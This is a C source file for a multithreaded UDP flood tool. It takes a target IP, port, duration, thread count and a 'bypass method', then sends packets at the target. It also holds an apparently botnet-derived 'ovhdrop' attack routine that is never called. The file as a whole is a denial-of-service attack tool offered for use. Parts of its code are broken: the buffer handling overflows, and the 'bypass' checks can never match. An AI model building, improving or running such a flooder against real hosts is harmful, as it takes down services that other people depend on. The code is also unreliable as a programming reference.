#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>
#include <pthread.h>

#define MAX_PAYLOAD_SIZE 1024
#define MAX_PACKETS_PER_SECOND 5000
#define MAX_THREADS 256

typedef uint16_t port_t;
typedef uint8_t BOOL;

struct attack_target {
    uint32_t addr;
    uint8_t netmask;
    struct sockaddr_in sock_addr;
};

struct attack_params {
    uint8_t targs_len;
    struct attack_target *targs;
    int attack_duration;
    int threads;
    int bypass_method;
};

uint32_t rand_next();
void rand_str(char *data, int len);
void generate_hex_payload(char *payload, int len);
void *attack_method_ovhdrop(void *args);

uint32_t rand_next() {
    static uint32_t seed = 0;
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    return seed;
}

void rand_str(char *data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] = rand_next() % 256;
    }
}

void generate_hex_payload(char *payload, int len) {
    for (int i = 0; i < len; i++) {
        payload[i] = i % 256;
    }
}

void *attack_method_ovhdrop(void *args) {
    struct attack_params *params = (struct attack_params *)args;
    int i;
    char **pkts = calloc(params->targs_len, sizeof(char *));
    int *fds = calloc(params->targs_len, sizeof(int));
    port_t sport = rand_next();
    struct sockaddr_in bind_addr = {0};

    for (i = 0; i < params->targs_len; i++) {
        pkts[i] = calloc(65535, sizeof(char));
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            perror("socket");
            return NULL;
        }

        int optval = 1;
        setsockopt(fds[i], SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = htons(rand_next() % 65535);
        bind_addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in)) == -1) {
            perror("bind");
            close(fds[i]);
            continue;
        }

        if (connect(fds[i], (struct sockaddr *)&params->targs[i].sock_addr, sizeof(struct sockaddr_in)) == -1) {
            perror("connect");
            close(fds[i]);
            continue;
        }
    }

    time_t start_time = time(NULL);
    while (1) {
        for (i = 0; i < params->targs_len; i++) {
            generate_hex_payload(pkts[i], MAX_PAYLOAD_SIZE / 2);
            send(fds[i], pkts[i], MAX_PAYLOAD_SIZE / 2, MSG_NOSIGNAL);
        }

        if (params->attack_duration > 0 && (time(NULL) - start_time) >= params->attack_duration) {
            break;
        }
    }

    for (i = 0; i < params->targs_len; i++) {
        close(fds[i]);
        free(pkts[i]);
    }
    free(pkts);
    free(fds);
    return NULL;
}

void *send_udp_packets(void *params) {
    struct attack_params *thread_params = (struct attack_params *)params;
    const char *ip = inet_ntoa(thread_params->targs[0].sock_addr.sin_addr);
    int port = ntohs(thread_params->targs[0].sock_addr.sin_port);
    int duration = thread_params->attack_duration;
    int bypass_method = thread_params->bypass_method;

    int sockfd;
    struct sockaddr_in server_addr;
    char payload[MAX_PAYLOAD_SIZE];
    time_t start_time, current_time;
    struct timespec sleep_time;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(ip);
    server_addr.sin_port = htons(port);

    srand(time(NULL));

    for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
        sprintf(payload + (i * 2), "%02x", rand() % 256);
    }

    if (bypass_method == 1) {
        for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
            if (payload[i * 2] == '0' && payload[(i * 2) + 1] == 'x') {
                payload[i * 2] = '1';
                payload[(i * 2) + 1] = 'a';
            }
        }
    } else if (bypass_method == 2) {
        for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
            if (payload[i * 2] == '0' && payload[(i * 2) + 1] == 'x') {
                payload[i * 2] = '2';
                payload[(i * 2) + 1] = '0';
            }
        }
    } else if (bypass_method == 3) {
        for (int i = 0; i < MAX_PAYLOAD_SIZE; i++) {
            if (payload[i * 2] == '0' && payload[(i * 2) + 1] == 'x') {
                payload[i * 2] = 'f';
                payload[(i * 2) + 1] = 'f';
            }
        }
    }

    start_time = time(NULL);

    printf("Sending UDP packets to %s:%d for %d seconds with bypass method %d...\n",
           ip, port, duration, bypass_method);

    int packets_sent = 0;
    while (1) {
        current_time = time(NULL);
        if (current_time - start_time >= duration) {
            break;
        }

        if (sendto(sockfd, payload, MAX_PAYLOAD_SIZE * 2, 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Sendto failed");
            break;
        }

        packets_sent++;

        sleep_time.tv_sec = 0;
        sleep_time.tv_nsec = 1000000000 / MAX_PACKETS_PER_SECOND;
        nanosleep(&sleep_time, NULL);
    }

    printf("Packet sending completed. Sent %d packets.\n", packets_sent);

    close(sockfd);

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf("Usage: %s <target_ip> <port> <duration_in_seconds> <threads> <bypass_method>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int attack_duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int bypass_method = atoi(argv[5]);

    struct attack_target targ;
    targ.addr = inet_addr(ip);
    targ.netmask = 24;
    targ.sock_addr.sin_family = AF_INET;
    targ.sock_addr.sin_port = htons(port);
    targ.sock_addr.sin_addr.s_addr = inet_addr(ip);

    struct attack_params params;
    params.targs_len = 1;
    params.targs = &targ;
    params.attack_duration = attack_duration;
    params.threads = threads;
    params.bypass_method = bypass_method;

    pthread_t thread_ids[threads];

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_udp_packets, &params) != 0) {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < threads; i++) {
        if (pthread_join(thread_ids[i], NULL) != 0) {
            perror("pthread_join");
            exit(EXIT_FAILURE);
        }
    }

    return 0;
}
